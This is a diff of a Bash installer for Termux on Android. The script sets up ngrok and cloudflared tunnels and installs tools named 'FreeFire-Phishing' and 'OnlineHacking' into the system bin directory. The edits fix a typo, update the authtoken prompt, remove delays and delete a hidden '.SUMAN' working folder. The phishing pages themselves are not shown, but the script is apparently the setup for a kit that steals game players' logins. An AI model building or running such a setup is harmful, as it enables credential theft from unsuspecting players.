@@ -63,7 +63,7 @@ download() {
 			cp -f $file > /dev/null 2>&1
 		fi
 		chmod +x $output $file > /dev/null 2>&1
-		rm1 -rf file1
+		rm -rf file1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
@@ -142,7 +142,7 @@ echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
 echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
 echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ngrok config add-authtoken 1ahJYl6 ] : \e[0m' token
 $token
 echo ""
 fi
@@ -151,7 +151,7 @@ clear
 fi
 }
 
-uninstall_1() {
+uninstall() {
 echo -e ""
 rm -rf /data/data/com.termux/files/usr/bin/ngrok
 rm -rf /data/data/com.termux/files/usr/bin/cloudflared
@@ -316,9 +316,6 @@ cp -R cloudflared ngrok .SUMAN/8/
 cp -R cloudflared ngrok .SUMAN/9/
 cp -R cloudflared ngrok .SUMAN/0/
 chmod 7777 FreeFire-Phishing
-sleep 5
-ls
-sleep 5
 clear
 echo
 uninstall
@@ -330,7 +327,6 @@ cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
 cp -R FreeFire-Phishing /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
-sleep 5
 clear
 echo
 logo
@@ -355,7 +351,7 @@ echo
 fi
 
 echo
-rm -rf Android-Setup.sh
-sleep 3
+rm -rf Android-Setup.sh .SUMAN
+sleep 2
 echo
 exit
